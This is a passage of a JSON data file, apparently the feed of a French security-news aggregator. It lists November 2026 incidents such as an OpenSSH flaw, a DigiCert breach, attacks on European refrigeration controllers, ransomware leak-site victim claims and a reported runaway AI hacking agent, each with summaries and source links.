+          "image": "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjHbl1TAGj_ZHZDF3oQ8AfebRDiovg_d8Wk4huY5VJkSa0csE45G7k5jwdG1De-W-7l2RjnyH_ZvT3vcioykVeOooifwvViM8RiuTu0gSt2t-XgOefyYKyM5_zbsI5WFNubkIT0hOUr4inPIQMvXs6GDTLa6j7XWL3etRJYvOcDLJxa3IDXv-KtuCma5JsG/s1600/ssh.jpg",
+          "sources": [
+            {
+              "url": "https://thehackernews.com/2026/11/hackers-exploited-openssh-sshole-flaw.html",
+              "label": "The Hacker News"
+            },
+            {
+              "url": "https://www.helpnetsecurity.com/2026/11/06/openssh-sshole-cve-2026-123158-exploitation/",
+              "label": "Help Net Security"
+            },
+            {
+              "url": "https://www.cyberattaque.org/openssh-cve-2026-123158/",
+              "label": "Cyberattaque.org"
+            },
+            {
+              "url": "https://www.it-connect.fr/faille-openssh-musl-sshhole-alpine-linux/",
+              "label": "IT-Connect"
+            }
+          ],
+          "url": "https://thehackernews.com/2026/11/hackers-exploited-openssh-sshole-flaw.html",
+          "pubDate": "2026-11-06T15:21:49.000Z"
+        },
+        {
+          "title": "Transcontinents : des hackers exploitent les réservations de l’agence de voyages réunionnaise",
+          "cve": null,
+          "severity": "high",
+          "score": 24,
+          "corroboration": 1,
+          "region": "fr",
+          "body": "Vulnérabilité élevée.\n\nL'agence de voyages Transcontinents, implantée à La Réunion, confirme avoir été victime d'une cyberattaque ayant entraîné le vol de données personnelles\n\nAttaque Mis à jour le 6 novembre 2026 à 16h01 Transcontinents : des hackers exploitent les réservations de l’agence de voyages réunionnaise L&rsquo;agence de voyages Transcontinents, implantée à La Réunion, confirme avoir été victime d&rsquo;une cyberattaque ayant entraîné le vol de données personnelles e…",
+          "detail": "Vulnérabilité élevée.\n\nL'agence de voyages Transcontinents, implantée à La Réunion, confirme avoir été victime d'une cyberattaque ayant entraîné le vol de données personnelles\n\nAttaque Mis à jour le 6 novembre 2026 à 16h01 Transcontinents : des hackers exploitent les réservations de l’agence de voyages réunionnaise L&rsquo;agence de voyages Transcontinents, implantée à La Réunion, confirme avoir été victime d&rsquo;une cyberattaque ayant entraîné le vol de données personnelles et d&rsquo;informations de réservation de ses clients. Les 20 et 21 octobre 2026, un accès non autorisé à son outil informatique a permis l&rsquo;extraction de noms, de coordonnées et de détails sur les voyages réservés. Depuis, des clients reçoivent de faux messages de confirmation reprenant leurs véritables informations de séjour pour tenter de récupérer leurs coordonnées bancaires. Une affaire qui présente d&rsquo;étonnantes similitudes avec plusieurs cyberattaques récentes contre des logiciels de réservation hôtelière.\n\nTranscontinents est une agence de voyages réunionnaise fondée en 1959. Présente à Saint-Denis, Saint-Pierre, Saint-Paul, au Tampon, à Saint-André et à Saint-Louis, l&rsquo;entreprise possède six agences physiques sur l&rsquo;île. Elle commercialise notamment des séjours vers l&rsquo;île Maurice, Rodrigues, Madagascar et d&rsquo;autres destinations internationales, ainsi que des billets d&rsquo;avion et des réservations hôtelières.\n\nDans une alerte officielle publiée sur son site internet, Transcontinents reconnaît qu&rsquo;un tiers non autorisé a accédé à son outil de réservation les 20 et 21 octobre 2026 .\n\nLes investigations menées par l&rsquo;entreprise ont confirmé une extraction de données personnelles concernant certains de ses clients.\n\nLes messages frauduleux reçus par",
+          "action": "Vérifier l'exposition du parc et appliquer le correctif éditeur dès sa disponibilité.",
+          "image": "https://www.cyberattaque.org/wp-content/uploads/2026/11/IMG_3753.jpeg",
+          "sources": [
+            {
+              "url": "https://www.cyberattaque.org/transcontinents-des-hackers-exploitent-les-reservations-de-lagence-de-voyages-reunionnaise/",
+              "label": "Cyberattaque.org"
+            }
+          ],
+          "url": "https://www.cyberattaque.org/transcontinents-des-hackers-exploitent-les-reservations-de-lagence-de-voyages-reunionnaise/",
+          "pubDate": "2026-11-06T15:01:21.000Z"
+        },
+        {
+          "title": "Pharmagest : une faille de sécurité pourrait exposer les données de patients de milliers de pharmacies françaises",
+          "cve": null,
+          "severity": "news",
+          "score": 16,
+          "corroboration": 1,
+          "region": "fr",
+          "body": "Vulnérabilité élevée.\n\nUne possible faille de sécurité touchant les logiciels Pharmagest, utilisés dans des milliers de pharmacies françaises, soulève de sérieuses\n\nAttaque Mis à jour le 6 novembre 2026 à 7h15 Pharmagest : une faille de sécurité pourrait exposer les données de patients de milliers de pharmacies françaises Une possible faille de sécurité touchant les logiciels Pharmagest, utilisés dans des milliers de pharmacies françaises, soulève de sérieuses interrogations sur…",
+          "detail": "Vulnérabilité élevée.\n\nUne possible faille de sécurité touchant les logiciels Pharmagest, utilisés dans des milliers de pharmacies françaises, soulève de sérieuses\n\nAttaque Mis à jour le 6 novembre 2026 à 7h15 Pharmagest : une faille de sécurité pourrait exposer les données de patients de milliers de pharmacies françaises Une possible faille de sécurité touchant les logiciels Pharmagest, utilisés dans des milliers de pharmacies françaises, soulève de sérieuses interrogations sur la protection des données des patients. Selon des signalements rendus publics le 5 novembre 2026, certains ordinateurs équipés de ces solutions pourraient être accessibles à distance par l&rsquo;intermédiaire d&rsquo;un serveur VNC insuffisamment sécurisé. Le problème serait particulièrement préoccupant : le mot de passe permettant de se connecter correspondrait au nom d&rsquo;hôte de la machine, autrement dit à son propre identifiant informatique. Plus inquiétant encore, cette faiblesse aurait déjà été signalée à l&rsquo;éditeur en septembre 2025, soit près de quatorze mois auparavant. À ce stade, ni l&rsquo;étendue de la vulnérabilité ni son éventuelle exploitation malveillante n&rsquo;ont été confirmées officiellement.\n\nLes révélations concernent Pharmagest, une division du groupe français Equasens, spécialisé dans les solutions numériques destinées aux professionnels de santé. L&rsquo;entreprise développe notamment le logiciel de gestion d&rsquo;officine id., anciennement connu sous le nom de LGPI, utilisé quotidiennement par de nombreux pharmaciens.\n\nSelon les informations diffusées le 5 novembre, certaines installations des solutions Pharmagest intégreraient un serveur VNC permettant de prendre le contrôle d&rsquo;un ordinateur à distance. La présence d&rsquo;un tel outil n&rsquo;est pas a",
+          "action": "Vérifier l'exposition du parc et appliquer le correctif éditeur dès sa disponibilité.",
+          "image": "https://www.cyberattaque.org/wp-content/uploads/2026/11/IMG_3738.jpeg",
+          "sources": [
+            {
+              "url": "https://www.cyberattaque.org/pharmagest-une-faille-de-securite-pourrait-exposer-les-donnees-de-patients-de-milliers-de-pharmacies-francaises/",
+              "label": "Cyberattaque.org"
+            }
+          ],
+          "url": "https://www.cyberattaque.org/pharmagest-une-faille-de-securite-pourrait-exposer-les-donnees-de-patients-de-milliers-de-pharmacies-francaises/",
+          "pubDate": "2026-11-06T06:15:26.000Z"
+        }
+      ]
+    },
+    {
+      "id": "attacks",
+      "items": [
+        {
+          "title": "Turning Up the Heat: Inside the Attacks on Europe’s Refrigeration System",
+          "cve": null,
+          "severity": "news",
+          "score": 86,
+          "corroboration": 1,
+          "region": "intl",
+          "body": "Incident de sécurité rapporté par Unit 42.\n\nUnit 42 examines recent cyberattacks targeting European refrigeration systems and outlines defense and mitigation strategies.\n\nUnit 42 has been actively monitoring for new developments related to the cyberattacks targeting refrigeration systems in Europe since at least October 2026.",
+          "detail": "Incident de sécurité rapporté par Unit 42.\n\nUnit 42 examines recent cyberattacks targeting European refrigeration systems and outlines defense and mitigation strategies.\n\nUnit 42 has been actively monitoring for new developments related to the cyberattacks targeting refrigeration systems in Europe since at least October 2026. The unidentified threat actors gained unauthorized access to refrigeration controllers and set them to defrost mode, resulting in hundreds of supermarkets across the region having to throw away spoiled food. The time of year when this activity has occurred is particularly concerning since retailers need to maintain adequate inventory levels as shoppers ramp up spending during holiday periods.\n\nHere we provide a high-level overview of the attacks based on public reporting and explore insights on device exposure by country, based on our findings using Cortex Xpanse . It also explores how Palo Alto Networks customers can leverage existing products and Unit 42 services to reduce their attack surface to mitigate similar threat activity in the future.\n\nThe first wave of these attacks occurred overnight between Oct. 11–12, 2026, primarily targeting approximately 700 supermarkets in France. Since that time, another wave occurred overnight between Nov. 1–2, 2026, expanding across at least 10 additional European countries and impacting over 100–115 retail locations.\n\nIn addition to the aforementioned activity, French authorities recently disclosed that refrigeration systems used by medical facilities were impacted by the attacks. At this time, there’s no evidence to suggest blood products were spoiled as a result.\n\nAccording to multiple sources, the threat actors behind the supermarket activities raised the temperature of the targeted refrigeration units as",
+          "action": "Surveiller les indicateurs de compromission associés et contrôler les actifs exposés.",
+          "image": "https://unit42.paloaltonetworks.com/wp-content/uploads/2026/11/06_Myth-Busting_Category_1505x922.jpg",
+          "sources": [
+            {
+              "url": "https://unit42.paloaltonetworks.com/europes-refrigeration-systems-attacks/",
+              "label": "Unit 42"
+            }
+          ],
+          "url": "https://unit42.paloaltonetworks.com/europes-refrigeration-systems-attacks/",
+          "pubDate": "2026-11-06T21:15:09.000Z"
+        },
+        {
+          "title": "Certificate authority DigiCert reports data breach involving business customer info",
+          "cve": null,
+          "severity": "news",
+          "score": 75,
+          "corroboration": 3,
+          "region": "intl",
+          "body": "Incident de sécurité rapporté par The Record.\n\nDigiCert explained that over the summer, an internal business system was \"externally accessible when that was not intended,\" and someone had created an unauthorized account.\n\nInternet security firm DigiCert reported a data breach involving an internal business system that was left exposed and eventually accessed by someone outside of the company.\n\nThe Utah-based company did not respond to requests for comment but posted a lengthy post-mortem on Mozilla's B…",
+          "detail": "Incident de sécurité rapporté par The Record.\n\nDigiCert explained that over the summer, an internal business system was \"externally accessible when that was not intended,\" and someone had created an unauthorized account.\n\nInternet security firm DigiCert reported a data breach involving an internal business system that was left exposed and eventually accessed by someone outside of the company.\n\nThe Utah-based company did not respond to requests for comment but posted a lengthy post-mortem on Mozilla's Bugzilla platform explaining the situation.\n\nDigiCert, which is a certificate authority and offers other corporate security services, said the incident began in February 2025 when an internal business system was moved out of a VPN-restricted network, making it accessible externally. Certificates typically help to verify the security of web servers.\n\n“Beginning on 2026-06-21, DigiCert determined that the business system was externally accessible when that was not intended, and that an unassigned account had been created,” the company said, adding that the issue was fixed by July 2.\n\nOn October 19, DigiCert confirmed that the database was accessed starting on June 27 and that it was a “reportable event.” The accessed data included customer names, business email addresses, phone numbers as well as documents like driver’s licenses, passports or utility bills and other info.\n\nA spokesperson for the company declined to say whether the attackers have contacted DigiCert, telling Recorded Future News that they are “focused on providing our customers with information relevant to them about the incident.”",
+          "action": "Surveiller les indicateurs de compromission associés et contrôler les actifs exposés.",
+          "image": "https://cms.therecord.media/uploads/digicert_logo_8468cb0d4a.jpg",
+          "sources": [
+            {
+              "url": "https://therecord.media/digicert-certificate-authority-reports-data-breach",
+              "label": "The Record"
+            },
+            {
+              "url": "https://www.securityweek.com/digicert-data-breach-impacts-business-customer-information/",
+              "label": "SecurityWeek"
+            },
+            {
+              "url": "https://www.theregister.com/security/2026/11/06/digicert-admits-16-month-security-lapse-exposed-customer-information/5308097",
+              "label": "The Register"
+            }
+          ],
+          "url": "https://therecord.media/digicert-certificate-authority-reports-data-breach",
+          "pubDate": "2026-11-06T18:56:00.000Z"
+        },
+        {
+          "title": "Centrepoint — rançongiciel N0n (SA)",
+          "cve": null,
+          "severity": "news",
+          "score": 73,
+          "corroboration": 1,
+          "region": "intl",
+          "body": "Incident de sécurité rapporté par ransomware.live.\n\nVictime revendiquée par le groupe de rançongiciel N0n. Pays : SA. Secteur : Energy & Utilities. fashion and lifestyle retail · Saudi Arabia | Loyalty program customer records with full names, email addresses, phone numbers and dates of birth covering 3,094,863 distinct customers of your storefronts; Shopper search sessions with typed queries and session identifiers for the storefronts and apps of a major Middle East fashion retail brand; Per query revenue…",
+          "detail": "Incident de sécurité rapporté par ransomware.live.\n\nVictime revendiquée par le groupe de rançongiciel N0n.\n\nPays : SA.\n\nSecteur : Energy & Utilities.\n\nfashion and lifestyle retail · Saudi Arabia | Loyalty program customer records with full names, email addresses, phone numbers and dates of birth covering 3,094,863 distinct customers of your storefronts; Shopper search sessions with typed queries and session identifiers for the storefronts and apps of a major Middle East fashion retail brand; Per query revenue and conversion intelligence; Site navigation revenue graphs; 1,372 distinct customer email addresses captured in the storefront's own email-parameter links (password-reset requests, newsletter preferences): 1,372 distinct customer addresses | [NOT PAID — EXPOSED]",
+          "action": "Surveiller les indicateurs de compromission associés et contrôler les actifs exposés.",
+          "image": "https://images.ransomware.live/victims/46f9dd932867b54ab8034b7d2c77fddf.png",
+          "sources": [
+            {
+              "url": "https://www.ransomware.live/id/Q2VudHJlcG9pbnRATjBu",
+              "label": "ransomware.live"
+            }
+          ],
+          "url": "https://www.ransomware.live/id/Q2VudHJlcG9pbnRATjBu",
+          "pubDate": "2026-11-06T10:52:15.603Z"
+        },
+        {
+          "title": "Chartboost LLC — rançongiciel N0n (États-Unis)",
+          "cve": null,
+          "severity": "news",
+          "score": 69,
+          "corroboration": 1,
+          "region": "intl",
+          "body": "Incident de sécurité rapporté par ransomware.live.\n\nVictime revendiquée par le groupe de rançongiciel N0n. Pays : États-Unis. Secteur : Technology. mobile advertising · United States | The internal business records of a mobile advertising network: monthly publisher account balance and earnings snapshots covering 185,545 accounts, January 2018 through September 2026; Advertiser and publisher performance reports from its data warehouse, 1,129,048,884 rows naming 14,497 advertiser companies and 43,211 publishe…",
+          "detail": "Incident de sécurité rapporté par ransomware.live.\n\nVictime revendiquée par le groupe de rançongiciel N0n.\n\nPays : États-Unis.\n\nSecteur : Technology.\n\nmobile advertising · United States | The internal business records of a mobile advertising network: monthly publisher account balance and earnings snapshots covering 185,545 accounts, January 2018 through September 2026; Advertiser and publisher performance reports from its data warehouse, 1,129,048,884 rows naming 14,497 advertiser companies and 43,211 publisher companies with their impressions, clicks, installs, spend and earnings; Marketplace transaction records with auction and bid pricing, including one complete week of the marketplace transaction archive at 293 GB uncompressed; An app user device event archive of 35,044,897 events carrying advertising identifiers, IP addresses and device details, plus device identity mapping records for 657,625,935 identifiers and 808,273,514 user app activity rows; Fraud investigation records naming investigated publisher companies | [NOT PAID — EXPOSED]",
+          "action": "Surveiller les indicateurs de compromission associés et contrôler les actifs exposés.",
+          "image": "https://images.ransomware.live/ransomware.png",
+          "sources": [
+            {
+              "url": "https://www.ransomware.live/id/VHVja2VyIEVsbGlzQFNpbGVudFJhbnNvbUdyb3Vw",
+              "label": "ransomware.live"
+            }
+          ],
+          "url": "https://www.ransomware.live/id/VHVja2VyIEVsbGlzQFNpbGVudFJhbnNvbUdyb3Vw",
+          "pubDate": "2026-11-06T18:58:01.954Z"
+        },
+        {
+          "title": "https://www.sleep-clinic.ca/ — rançongiciel incransom (Canada)",
+          "cve": null,
+          "severity": "news",
+          "score": 69,
+          "corroboration": 1,
+          "region": "intl",
+          "body": "Incident de sécurité rapporté par ransomware.live.\n\nVictime revendiquée par le groupe de rançongiciel incransom. Pays : Canada. Secteur : Healthcare. The Sleep Disorders Clinic offers a full range of diagnostic and therapeutic sleep services, including night time sleep studies and daytime tests. Our 3 locations contain private bedrooms and we perform sleep studies 7 nights a week. Most services are covered by OHIP and all new patients require a referral from their family doctor or specialist.",
+          "detail": "Incident de sécurité rapporté par ransomware.live.\n\nVictime revendiquée par le groupe de rançongiciel incransom.\n\nPays : Canada.\n\nSecteur : Healthcare.\n\nThe Sleep Disorders Clinic offers a full range of diagnostic and therapeutic sleep services, including night time sleep studies and daytime tests. Our 3 locations contain private bedrooms and we perform sleep studies 7 nights a week. Most services are covered by OHIP and all new patients require a referral from their family doctor or specialist. Sleep studies are offered in Hamilton, St Catharines and Cambridge Memorial Hospital.",
+          "action": "Surveiller les indicateurs de compromission associés et contrôler les actifs exposés.",
+          "image": "https://images.ransomware.live/victims/5b8eb6ce08c39c52010a459548e1814b.png",
+          "sources": [
+            {
+              "url": "https://www.ransomware.live/id/aHR0cHM6Ly93d3cuc2xlZXAtY2xpbmljLmNhL0BpbmNyYW5zb20=",
+              "label": "ransomware.live"
+            }
+          ],
+          "url": "https://www.ransomware.live/id/aHR0cHM6Ly93d3cuc2xlZXAtY2xpbmljLmNhL0BpbmNyYW5zb20=",
+          "pubDate": "2026-11-06T12:00:00.000Z"
+        },
+        {
+          "title": "Fake security tools on GitHub push backdoors and infostealers",
+          "cve": null,
+          "severity": "news",
+          "score": 68,
+          "corroboration": 1,
+          "region": "intl",
+          "body": "Incident de sécurité rapporté par BleepingComputer.\n\nCybersecurity professionals are being targeted with infected security projects on GitHub that deploy a backdoor and information stealer malware.\n\nOpenSSH flaw lets attackers log into password-disabled Linux accounts\n\nDigiCert data breach exposes customer information, identity documents\n\nZyxel fixes zero-day exploited to hack nearly 1,000 network switches\n\nNIKKE PC game launcher hacked to spread remote access, data-stealing malware\n\nSonicWall warns of new S…",
+          "detail": "Incident de sécurité rapporté par BleepingComputer.\n\nCybersecurity professionals are being targeted with infected security projects on GitHub that deploy a backdoor and information stealer malware.\n\nOpenSSH flaw lets attackers log into password-disabled Linux accounts\n\nDigiCert data breach exposes customer information, identity documents\n\nZyxel fixes zero-day exploited to hack nearly 1,000 network switches\n\nNIKKE PC game launcher hacked to spread remote access, data-stealing malware\n\nSonicWall warns of new SSL-VPN MFA bypass flaw exploited in attacks\n\nRunaway AI hacking agent behind WorkOS breach after escaping sandbox",
+          "action": "Surveiller les indicateurs de compromission associés et contrôler les actifs exposés.",
+          "image": "https://www.bleepstatic.com/content/hl-images/2026/11/06/github.jpg",
+          "sources": [
+            {
+              "url": "https://www.bleepingcomputer.com/news/security/fake-security-tools-on-github-push-backdoors-and-infostealers/",
+              "label": "BleepingComputer"
+            }
+          ],
+          "url": "https://www.bleepingcomputer.com/news/security/fake-security-tools-on-github-push-backdoors-and-infostealers/",
+          "pubDate": "2026-11-06T18:46:52.000Z"
+        },
+        {
+          "title": "Japan Announces Emergency Cybersecurity Package Following a Wave of Attacks",
+          "cve": null,
+          "severity": "news",
+          "score": 68,
+          "corroboration": 1,
+          "region": "intl",
+          "body": "Incident de sécurité rapporté par SecurityWeek.\n\nThe emergency package comes after dozens of companies and government agencies were hit by unauthorized access to their systems and leaks of client data, prompting uneasiness across Japan. The post Japan Announces Emergency Cybersecurity Package Following a Wave of Attacks appeared first on SecurityWeek .",
+          "detail": "Incident de sécurité rapporté par SecurityWeek.\n\nThe emergency package comes after dozens of companies and government agencies were hit by unauthorized access to their systems and leaks of client data, prompting uneasiness across Japan. The post Japan Announces Emergency Cybersecurity Package Following a Wave of Attacks appeared first on SecurityWeek .",
+          "action": "Surveiller les indicateurs de compromission associés et contrôler les actifs exposés.",
+          "image": "https://www.securityweek.com/wp-content/uploads/2025/11/Geopolitics-Cybersecurity.jpg",
+          "sources": [
+            {
+              "url": "https://www.securityweek.com/japan-announces-emergency-cybersecurity-package-following-a-wave-of-attacks/",
+              "label": "SecurityWeek"
+            }
+          ],
+          "url": "https://www.securityweek.com/japan-announces-emergency-cybersecurity-package-following-a-wave-of-attacks/",
+          "pubDate": "2026-11-06T18:28:41.000Z"
+        },
+        {
+          "title": "In Other News: Trezor Implant, LLMJacking Bills Hit $1M, SAP Flaws Weaponized Within Days",
+          "cve": null,
+          "severity": "news",
+          "score": 65,
+          "corroboration": 1,
+          "region": "intl",
+          "body": "Incident de sécurité rapporté par SecurityWeek.\n\nA reported Trezor wallet implant, LLMJacking bills reaching $1 million, and SAP flaws weaponized within days of patches.\n\nNoteworthy stories that might have slipped under the radar: Synology warns about NAS ransomware attacks, Flowise ‘hello’ attacks, Chainalysis breach impact expands.\n\nSubscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights.\n\nSubscribe to the SecurityWeek Email Briefing to stay inform…",
+          "detail": "Incident de sécurité rapporté par SecurityWeek.\n\nA reported Trezor wallet implant, LLMJacking bills reaching $1 million, and SAP flaws weaponized within days of patches.\n\nNoteworthy stories that might have slipped under the radar: Synology warns about NAS ransomware attacks, Flowise ‘hello’ attacks, Chainalysis breach impact expands.\n\nSubscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights.\n\nSubscribe to the SecurityWeek Email Briefing to stay informed on the latest threats, trends, and technology, along with insightful columns from industry experts.\n\nClose the security gaps between pentests. Join this session to explore agentic pentesting and gain a practical framework for continuous exposure validation in your CTEM program.\n\nJoin as we bring together CISOs, senior cybersecurity executives, practitioners, industry experts, and other security leaders to share practical experience and examine the issues shaping enterprise cybersecurity strategy.\n\nCloudflare has appointed Christian Smith as President of Revenue.",
+          "action": "Surveiller les indicateurs de compromission associés et contrôler les actifs exposés.",
+          "image": "https://www.securityweek.com/wp-content/uploads/2023/10/cybersecurity-news.jpg",
+          "sources": [
+            {
+              "url": "https://www.securityweek.com/in-other-news-trezor-implant-llmjacking-bills-hit-1m-sap-flaws-weaponized-within-days/",
+              "label": "SecurityWeek"
+            }
+          ],
+          "url": "https://www.securityweek.com/in-other-news-trezor-implant-llmjacking-bills-hit-1m-sap-flaws-weaponized-within-days/",
+          "pubDate": "2026-11-06T14:40:09.000Z"
+        },
+        {
+          "title": "Grocery Giant Ahold Delhaize Estimates Financial Toll of October Cyberattack",
+          "cve": null,
+          "severity": "news",
+          "score": 64,
+          "corroboration": 1,
+          "region": "intl",
+          "body": "Incident de sécurité rapporté par SecurityWeek.\n\nAhold Delhaize expects its October cyberattack to cut Q4 net sales by €200-250 million and has lowered its full-year 2026 guidance.\n\nThe October incident will cut fourth-quarter sales by up to €250 million and has led Ahold Delhaize to lower its 2026 outlook.\n\nSubscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights.\n\nSubscribe to the SecurityWeek Email Briefing to stay informed on the latest threats, t…",
+          "detail": "Incident de sécurité rapporté par SecurityWeek.\n\nAhold Delhaize expects its October cyberattack to cut Q4 net sales by €200-250 million and has lowered its full-year 2026 guidance.\n\nThe October incident will cut fourth-quarter sales by up to €250 million and has led Ahold Delhaize to lower its 2026 outlook.\n\nSubscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights.\n\nSubscribe to the SecurityWeek Email Briefing to stay informed on the latest threats, trends, and technology, along with insightful columns from industry experts.\n\nClose the security gaps between pentests. Join this session to explore agentic pentesting and gain a practical framework for continuous exposure validation in your CTEM program.\n\nJoin as we bring together CISOs, senior cybersecurity executives, practitioners, industry experts, and other security leaders to share practical experience and examine the issues shaping enterprise cybersecurity strategy.\n\nCloudflare has appointed Christian Smith as President of Revenue.",
+          "action": "Surveiller les indicateurs de compromission associés et contrôler les actifs exposés.",
+          "image": "https://www.securityweek.com/wp-content/uploads/2024/11/Ahold-Delhaize-cyberattack.jpeg",
+          "sources": [
+            {
+              "url": "https://www.securityweek.com/grocery-giant-ahold-delhaize-estimates-financial-toll-of-october-cyberattack/",
+              "label": "SecurityWeek"
+            }
+          ],
+          "url": "https://www.securityweek.com/grocery-giant-ahold-delhaize-estimates-financial-toll-of-october-cyberattack/",
+          "pubDate": "2026-11-06T12:47:55.000Z"
+        },
+        {
+          "title": "Hackers Hide Linux Backdoor in Control Web Panel Server to Execute Commands Without Logs",
+          "cve": null,
+          "severity": "news",
+          "score": 64,
+          "corroboration": 1,
+          "region": "intl",
+          "body": "Incident de sécurité rapporté par The Hacker News.\n\nA backdoor has been found hiding in the web server that runs Control Web Panel (CWP), a free panel for managing Linux hosting servers, researchers at QiAnXin's XLab said this week. The backdoored web server executes commands that attackers send via web requests, and those requests never appear in its access logs. Installing it takes root access, so the attackers must already control the server.",
+          "detail": "Incident de sécurité rapporté par The Hacker News.\n\nA backdoor has been found hiding in the web server that runs Control Web Panel (CWP), a free panel for managing Linux hosting servers, researchers at QiAnXin's XLab said this week. The backdoored web server executes commands that attackers send via web requests, and those requests never appear in its access logs. Installing it takes root access, so the attackers must already control the server.",
+          "action": "Surveiller les indicateurs de compromission associés et contrôler les actifs exposés.",
+          "image": "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjsAMxBevh2cmz1buKWukyP6JgUHrIPcr9zrJjAs1OwDoP1wMjn_s_WKHeUAdSwVzTImUsDE0C3SLGEpciaLk9H8CGvqiYugQWASsflB1a5zA9Wyr4RbroT3Z3JlOeak1AEinAy7Brf9N0BRDuGFWdZC23nCrOq4VuSMQQuDFYBYC6YCEm2ncPhHOv3KXs/s1600/cwp.jpg",
+          "sources": [
+            {
+              "url": "https://thehackernews.com/2026/11/hackers-hide-linux-backdoor-in-control.html",
+              "label": "The Hacker News"
+            }
+          ],
+          "url": "https://thehackernews.com/2026/11/hackers-hide-linux-backdoor-in-control.html",
+          "pubDate": "2026-11-06T05:58:54.000Z"
+        },
+        {
+          "title": "Runaway AI hacking agent behind WorkOS breach after escaping sandbox",
+          "cve": null,
+          "severity": "news",
+          "score": 63,
+          "corroboration": 1,
+          "region": "intl",
+          "body": "Incident de sécurité rapporté par BleepingComputer.\n\nWorkOS says an AI-powered hacking agent that breached its internal sales application and accessed customer information was operated by a security researcher who claims the tool escaped its testing environment and unintentionally attacked the company.\n\nOpenSSH flaw lets attackers log into password-disabled Linux accounts\n\nDigiCert data breach exposes customer information, identity documents\n\nZyxel fixes zero-day exploited to hack nearly 1,000 network switch…",
+          "detail": "Incident de sécurité rapporté par BleepingComputer.\n\nWorkOS says an AI-powered hacking agent that breached its internal sales application and accessed customer information was operated by a security researcher who claims the tool escaped its testing environment and unintentionally attacked the company.\n\nOpenSSH flaw lets attackers log into password-disabled Linux accounts\n\nDigiCert data breach exposes customer information, identity documents\n\nZyxel fixes zero-day exploited to hack nearly 1,000 network switches\n\nNIKKE PC game launcher hacked to spread remote access, data-stealing malware\n\nSonicWall warns of new SSL-VPN MFA bypass flaw exploited in attacks\n\nRunaway AI hacking agent behind WorkOS breach after escaping sandbox",
+          "action": "Surveiller les indicateurs de compromission associés et contrôler les actifs exposés.",
+          "image": "https://www.bleepstatic.com/content/hl-images/2026/11/03/workos.jpg",
+          "sources": [
+            {
+              "url": "https://www.bleepingcomputer.com/news/security/runaway-ai-hacking-agent-behind-workos-breach-after-escaping-sandbox/",
+              "label": "BleepingComputer"
+            }
+          ],
+          "url": "https://www.bleepingcomputer.com/news/security/runaway-ai-hacking-agent-behind-workos-breach-after-escaping-sandbox/",
+          "pubDate": "2026-11-06T22:27:25.000Z"
+        },
+        {
+          "title": "IMSI vs IMEI: What Your Phone Broadcasts and Who Can Read It",
+          "cve": null,
+          "severity": "news",
+          "score": 63,
+          "corroboration": 1,
+          "region": "intl",
+          "body": "Incident de sécurité rapporté par BleepingComputer.\n\nIMSI and IMEI are IDs your phone shares with networks. Learn how they differ, how attackers get them, and why rotating your IMSI blunts tracking.\n\nOpenSSH flaw lets attackers log into password-disabled Linux accounts\n\nDigiCert data breach exposes customer information, identity documents\n\nZyxel fixes zero-day exploited to hack nearly 1,000 network switches\n\nNIKKE PC game launcher hacked to spread remote access, data-stealing malware\n\nSonicWall warns of new…",
+          "detail": "Incident de sécurité rapporté par BleepingComputer.\n\nIMSI and IMEI are IDs your phone shares with networks. Learn how they differ, how attackers get them, and why rotating your IMSI blunts tracking.\n\nOpenSSH flaw lets attackers log into password-disabled Linux accounts\n\nDigiCert data breach exposes customer information, identity documents\n\nZyxel fixes zero-day exploited to hack nearly 1,000 network switches\n\nNIKKE PC game launcher hacked to spread remote access, data-stealing malware\n\nSonicWall warns of new SSL-VPN MFA bypass flaw exploited in attacks\n\nRunaway AI hacking agent behind WorkOS breach after escaping sandbox",
+          "action": "Surveiller les indicateurs de compromission associés et contrôler les actifs exposés.",
+          "image": "https://www.bleepstatic.com/content/posts/2026/11/04/cell-tower-header.jpg",
+          "sources": [
+            {
+              "url": "https://www.bleepingcomputer.com/news/security/imsi-vs-imei-what-your-phone-broadcasts-and-who-can-read-it/",
+              "label": "BleepingComputer"
+            }
+          ],
+          "url": "https://www.bleepingcomputer.com/news/security/imsi-vs-imei-what-your-phone-broadcasts-and-who-can-read-it/",
+          "pubDate": "2026-11-06T15:00:10.000Z"
+        },
+        {
+          "title": "Chainalysis says breach exposed credentials for all customers",
+          "cve": null,
+          "severity": "news",
+          "score": 63,
+          "corroboration": 1,
+          "region": "intl",
+          "body": "Incident de sécurité rapporté par BleepingComputer.\n\nBlockchain intelligence firm Chainalysis says a recent attack on its systems and internal tools has exposed credentials and live tokens for all customers.\n\nOpenSSH flaw lets attackers log into password-disabled Linux accounts\n\nDigiCert data breach exposes customer information, identity documents\n\nZyxel fixes zero-day exploited to hack nearly 1,000 network switches\n\nNIKKE PC game launcher hacked to spread remote access, data-stealing malware\n\nSonicWall warn…",
+          "detail": "Incident de sécurité rapporté par BleepingComputer.\n\nBlockchain intelligence firm Chainalysis says a recent attack on its systems and internal tools has exposed credentials and live tokens for all customers.\n\nOpenSSH flaw lets attackers log into password-disabled Linux accounts\n\nDigiCert data breach exposes customer information, identity documents\n\nZyxel fixes zero-day exploited to hack nearly 1,000 network switches\n\nNIKKE PC game launcher hacked to spread remote access, data-stealing malware\n\nSonicWall warns of new SSL-VPN MFA bypass flaw exploited in attacks\n\nRunaway AI hacking agent behind WorkOS breach after escaping sandbox",
+          "action": "Surveiller les indicateurs de compromission associés et contrôler les actifs exposés.",
+          "image": "https://www.bleepstatic.com/content/hl-images/2026/11/06/0_Chainalysis.jpg",
+          "sources": [
+            {
+              "url": "https://www.bleepingcomputer.com/news/security/chainalysis-says-breach-exposed-credentials-for-all-customers/",
+              "label": "BleepingComputer"
+            }
+          ],
+          "url": "https://www.bleepingcomputer.com/news/security/chainalysis-says-breach-exposed-credentials-for-all-customers/",
+          "pubDate": "2026-11-06T14:17:07.000Z"
+        },
+        {
+          "title": "MetaMask says recent attack didn't affect wallet infrastructure",
+          "cve": null,
+          "severity": "news",
+          "score": 63,
+          "corroboration": 1,
+          "region": "intl",
